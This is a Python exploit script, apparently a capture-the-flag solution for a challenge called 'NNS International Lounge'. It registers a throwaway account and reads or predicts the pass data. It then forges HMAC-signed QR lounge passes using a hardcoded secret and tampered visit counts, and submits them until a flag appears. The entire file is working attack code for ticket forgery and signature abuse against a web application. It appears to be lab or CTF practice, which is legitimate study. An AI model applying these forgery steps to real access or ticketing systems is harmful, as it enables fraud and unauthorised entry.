#!/usr/bin/env python3
import argparse
import hashlib
import hmac
import io
import random
import re
import string
import sys
from datetime import datetime, timedelta, timezone

import qrcode
import requests

TICKET_SECRET = hashlib.sha256(b"lounge").digest()
VISIT_ALLOWANCE = 4


def sign(fields):
    return hmac.new(TICKET_SECRET, "/".join(fields).encode(), hashlib.sha256).hexdigest()[:6]


def encode_pass(fields):
    return "/".join(fields + [sign(fields)])


def qr_png_bytes(payload: str) -> bytes:
    bio = io.BytesIO()
    qrcode.make(payload).save(bio, format="PNG")
    return bio.getvalue()


def try_decode_qr_png(data: bytes):
    try:
        from PIL import Image
        from pyzbar.pyzbar import decode
        img = Image.open(io.BytesIO(data))
        decoded = decode(img)
        if len(decoded) == 1:
            return decoded[0].data.decode("utf-8", "replace")
    except Exception:
        return None
    return None


def rand_word(prefix: str) -> str:
    return prefix + "".join(random.choice(string.ascii_lowercase) for _ in range(8))


def normalize_base(url: str) -> str:
    url = url.rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url


def parse_member_id(html: str) -> str:
    m = re.search(r"Lounge access number.*?<strong>(\d+)</strong>", html, re.S)
    if not m:
        m = re.search(r"81\d{14}", html)
    if not m:
        raise RuntimeError("member_id tidak ketemu di halaman account")
    return m.group(1)


def register(session: requests.Session, base: str):
    first = rand_word("Nata")
    last = rand_word("Lounge")
    password = rand_word("Pass") + "123!"
    r = session.post(
        base + "/register",
        data={"first_name": first, "last_name": last, "password": password},
        allow_redirects=True,
        timeout=10,
    )
    r.raise_for_status()
    if "Lounge access number" not in r.text:
        raise RuntimeError("register gagal / tidak masuk ke halaman account")
    return first, last, parse_member_id(r.text), r.text


def get_ticket_fields(session: requests.Session, base: str, first: str, last: str, member_id: str):
    # Reliable path: decode QR yang memang diterbitkan server.
    r = session.get(base + "/pass.png", timeout=10)
    r.raise_for_status()
    payload = try_decode_qr_png(r.content)
    if payload:
        parts = payload.strip().split("/")
        if len(parts) == 10:
            return parts[:-1]

    # Fallback kalau host lokal belum punya libzbar/pyzbar: prediksi menit issue.
    # Server memakai datetime.now(timezone.utc).replace(second=0, microsecond=0)
    # saat register. Coba beberapa menit sekitar waktu request.
    now = datetime.now(timezone.utc).replace(second=0, microsecond=0)
    name = f"{first} {last}"
    candidates = []
    for delta in range(-5, 6):
        issued_dt = now + timedelta(minutes=delta)
        expires_dt = issued_dt + timedelta(days=365)
        issued = issued_dt.strftime("%d%m%y%H%M")
        expires = expires_dt.strftime("%d%m%y%H%M")
        candidates.append([
            "LS", issued[:6], issued, expires, member_id, "NNS", "201", name, str(VISIT_ALLOWANCE)
        ])
    return candidates


def submit_ticket(session: requests.Session, base: str, fields):
    payload = encode_pass(fields)
    png = qr_png_bytes(payload)
    files = {"ticket": ("pass.png", png, "image/png")}
    r = session.post(base + "/lounge", files=files, allow_redirects=True, timeout=10)
    return r


def main():
    ap = argparse.ArgumentParser(description="Exploit NNS International Lounge")
    ap.add_argument("target", nargs="?", default="http://127.0.0.1:3000", help="base URL, contoh: http://host:port")
    args = ap.parse_args()

    base = normalize_base(args.target)
    session = requests.Session()

    first, last, member_id, _ = register(session, base)
    print(f"[+] registered: {first} {last}")
    print(f"[+] member_id : {member_id}")

    ticket_fields = get_ticket_fields(session, base, first, last, member_id)
    if ticket_fields and isinstance(ticket_fields[0], str):
        candidates = [ticket_fields]
    else:
        candidates = ticket_fields

    last_text = ""
    for base_fields in candidates:
        if len(base_fields) != 9:
            continue
        print(f"[+] trying issued={base_fields[2]} expires={base_fields[3]}")
        ok = True
        for remaining in [5, 4, 3, 2, 1]:
            fields = base_fields[:8] + [str(remaining)]
            r = submit_ticket(session, base, fields)
            last_text = r.text
            m = re.search(r"NNS\{[^}]+\}", r.text)
            print(f"    submitted remaining={remaining}, status={r.status_code}")
            if m:
                print(f"<FLAG>{m.group(0)}</FLAG>")
                return
            if "Pass details do not match" in r.text or "invalid ticket signature" in r.text:
                ok = False
                break
        if ok:
            break

    print("[-] flag belum ketemu", file=sys.stderr)
    print(last_text[:500], file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
